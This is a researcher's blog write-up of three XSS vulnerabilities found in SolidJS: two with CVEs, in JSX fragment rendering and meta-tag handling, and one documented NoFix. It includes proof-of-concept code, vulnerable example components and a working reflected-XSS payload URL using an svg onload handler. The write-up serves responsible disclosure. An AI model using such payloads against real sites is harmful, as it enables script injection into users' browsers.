---
title: "3 XSS Vulnerabilities discovered in SolidJS"
description: "Write up of 3 XSS vulnerabilities I found in SolidJS with 2 CVEs! At the beginning of the year, while I was using SolidJS to develop some project, I noticed some weird behaviour and attempted to investigate the bugs behind it. In the end, I found 2 XSS vulnerabilities with CVEs and 1 NoFix."
date: "Feb 22 2025"
tags: ["write up", "xss"]
image: '/images/solid-thumbnail.png'
---

### Introduction
At the beginning of the year, while I was using SolidJS to develop some project, I noticed some weird behaviour and attempted to investigate the bugs behind it. In the end, I found 2 XSS vulnerabilities with CVEs and 1 NoFix.

### XSS in JSX fragments (CVE-2025-27109)
In short, the `ssr` function in SolidJS fails to sanitize JSX expressions in JSX fragments.

PoC
```js
  console.log(ssr("!!", <div>{"<div></div>"}</div>));
  // { t: '!<div>&lt;div>&lt;/div></div>!' }
  console.log(ssr("!!", <>{"<div></div>"}</>));
  // { t: '!<div></div>!' }
```
```js
const [text] = createResource(() => {
  return new URL(getRequestEvent().request.url).searchParams.get("text");
});

return (
  <>
    Text: {text()}
  </>
);
```

Apparently the function was imported from `dom-expressions`, a library for developing front-end frameworks by @ryansolid. However, the team forgot to update the replica in SolidJS when they applied escaping to `dom-expressions`. 

Advisory: https://github.com/solidjs/solid/security/advisories/GHSA-3qxh-p7jc-5xh6

This was the bug I found accidentally while working with SolidJS.

### XSS in meta tags (CVE-2025-27108)
I was curious as to whether I could find more vulns after the previous finding, so I went ahead and looked around their discord server. I found [this issue](https://github.com/solidjs/solid-meta/issues/54) which mentioned that `$'` in the meta tag breaks ssr. 

Does this look familiar? If you have seen my [write up on web/submission](/posts/2025-lactf-antisocial-media/), you may immediately recognise this as the **special replacement patterns** of the `.replace` function in JavaScript. *I have explained the feature in detail in that blog, please take a look at that write up if you want to know about how .replace works.*

For instance, if something like this were to be used, placing user defined variables(like profile description for the open graph protocol), then rXSS can be achieved with the payload ```http://localhost:3000/?username=$`<svg/onload=alert(1)>```.
```js
export default function App() {
  const [username] = createResource(() => {
    return new URL(getRequestEvent().request.url).searchParams.get("username");
  });

  return (
    <main>
      <MetaProvider>
        <Meta property="og:title" content={username()} />
        <Meta property="og:type" content="profile" />
      </MetaProvider>
      <div>
        Welcome to the profile of {username()}.
      </div>
    </main>
  );
}
```

Advisory: https://github.com/ryansolid/dom-expressions/security/advisories/GHSA-hw62-58pr-7wc5

### XSS in noscript
To summarize, I found that the sanitize function which SolidJS does not sanitize the `<` character in attributes, which is quite [a well-known trick](https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/).
```js
export function escapeHTML(s, attr) {
  if (typeof s !== "string") return s;
  const delim = attr ? '"' : "<";
  const escDelim = attr ? "&quot;" : "&lt;";
  ...
```

The team decided that this was not severe enough(which was reasonable), and documented it in their newly created security guide instead.
https://github.com/solidjs/solid-docs/pull/1090

### References
- https://github.com/ryansolid/dom-expressions/blob/main/packages/babel-plugin-jsx-dom-expressions/src/shared/transform.js
- https://github.com/solidjs/solid/commit/b93956f28ed75469af6976a98728e313d0edd236
- https://github.com/solidjs/solid-meta/issues/54
- https://github.com/ryansolid/dom-expressions/commit/521f75dfa89ed24161646e7007d9d7d21da07767
- https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/
- https://github.com/solidjs/solid-docs/pull/1090
- https://github.com/ryansolid/dom-expressions/security/advisories/GHSA-hw62-58pr-7wc5
- https://github.com/solidjs/solid/security/advisories/GHSA-3qxh-p7jc-5xh6